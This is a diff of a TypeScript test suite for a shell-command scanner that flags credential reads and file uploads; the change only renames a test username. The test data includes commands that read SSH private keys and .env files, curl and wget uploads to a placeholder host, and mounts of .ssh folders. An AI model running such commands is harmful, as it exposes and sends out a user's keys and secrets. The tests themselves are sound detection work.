@@ -210,7 +210,7 @@ describe("credential-exfiltration signal", () => {
     "npx --config .env prettier src",
     "deno run --env-file=.env main.ts",
     "deno run --env-file main.ts",
-    "npx -c 'cat /home/operator/.ssh/id_rsa'",
+    "npx -c 'cat /home/owner/.ssh/id_rsa'",
     "bun --eval 'console.log(readFileSync(\".env\"))'",
   ])("retains sensitive paths in runner arguments and literal code: %j", (command) => {
     expect(shellSensitivePathSignal(command, CWD)).not.toBeNull();
@@ -298,18 +298,18 @@ describe("bounded sensitive-path inspection", () => {
 
   it("keeps late literal credentials and uploads above exhaustion", () => {
     const prefix = `npx curl ${Array.from({ length: 2048 }, (_, index) => `x${index}`).join(" ")}`;
-    expect(shellSensitivePathSignal(`${prefix} /home/operator/.ssh/id_rsa`, CWD)).not.toBeNull();
+    expect(shellSensitivePathSignal(`${prefix} /home/owner/.ssh/id_rsa`, CWD)).not.toBeNull();
     expect(shellSensitivePathSignal(`${prefix} --env-file=.env`, CWD)).not.toBeNull();
     expect(shellExfiltrationSignal(`${prefix} -T file http://example.test`, CWD)).toMatch(/curl upload/);
     expect(shellExfiltrationSignal(`${prefix} wget --post-file file http://example.test`, CWD)).toMatch(/wget body/);
     expect(shellExfiltrationSignal(`${prefix} --call='curl -T file http://example.test'`, CWD)).toMatch(/curl upload/);
-    const globParsed = parseShellCommand(`${prefix} /home/operator/.s*/config`);
+    const globParsed = parseShellCommand(`${prefix} /home/owner/.s*/config`);
     expect(shellScanOrdinaryAsk(globParsed, CWD)).toMatch(/budget exceeded/);
     expect(shellSensitivePathSignal(globParsed, CWD)).not.toBeNull();
-    expect(shellSensitivePathSignal(`${prefix} /home/operator/.{ssh,aws}/config`, CWD)).not.toBeNull();
+    expect(shellSensitivePathSignal(`${prefix} /home/owner/.{ssh,aws}/config`, CWD)).not.toBeNull();
     const tail = Array.from({ length: 1024 }, (_, index) => `tail${index}`).join(" ");
     for (const head of [prefix, `cat ${Array.from({ length: 2048 }, (_, index) => `x${index}`).join(" ")}`]) {
-      for (const path of ["/home/operator/.ssh/id_rsa", "/home/operator/.s*/config", "/home/operator/.{ssh,aws}/config"]) {
+      for (const path of ["/home/owner/.ssh/id_rsa", "/home/owner/.s*/config", "/home/owner/.{ssh,aws}/config"]) {
         expect(shellSensitivePathSignal(`${head} ${path}`, CWD)).not.toBeNull();
         expect(shellSensitivePathSignal(`${head} ${path} ${tail}`, CWD)).not.toBeNull();
       }
@@ -507,19 +507,19 @@ describe("security review: a sensitive path in any shell argument is a floor", (
 describe("path sources in colon destination bindings", () => {
   it.each([
     "~/.ssh:/x",
-    "/home/operator/.ssh:/x",
+    "/home/owner/.ssh:/x",
     "./.ssh:/x:ro",
     ".env:/x",
     "--source=~/.ssh:/x",
     "-v=~/.ssh:/x",
     "-v~/.ssh:/x",
-    "-v/home/operator/.ssh:/x",
-    "file:///home/operator/.ssh:/x",
-    "--source=file:///home/operator/.ssh:/x",
-    "C:\\Users\\operator\\.ssh:\\x",
-    "C:\\Users\\operator\\.ssh:C:\\x",
-    "--source=C:\\Users\\operator\\.ssh:C:\\x",
-    "-vC:\\Users\\operator\\.ssh:C:\\x",
+    "-v/home/owner/.ssh:/x",
+    "file:///home/owner/.ssh:/x",
+    "--source=file:///home/owner/.ssh:/x",
+    "C:\\Users\\owner\\.ssh:\\x",
+    "C:\\Users\\owner\\.ssh:C:\\x",
+    "--source=C:\\Users\\owner\\.ssh:C:\\x",
+    "-vC:\\Users\\owner\\.ssh:C:\\x",
   ])("retains a credential source in %s", (argument) => {
     expect(sensitivePathInArgumentText(argument, CWD)).not.toBeNull();
     const command = `bind-tool '${argument}'`;
@@ -537,8 +537,8 @@ describe("path sources in colon destination bindings", () => {
     "-v/work/data:/x",
     "-v=./data:/x",
     "--source=/work/data:/x",
-    "C:\\Users\\operator\\Documents:C:\\docs",
-    "-vC:\\Users\\operator\\Documents:C:\\docs",
+    "C:\\Users\\owner\\Documents:C:\\docs",
+    "-vC:\\Users\\owner\\Documents:C:\\docs",
     "~/.ssh.md:/x",
     "https://example.test/.ssh:/x",
     "https://operator@example.test/.ssh:/x",
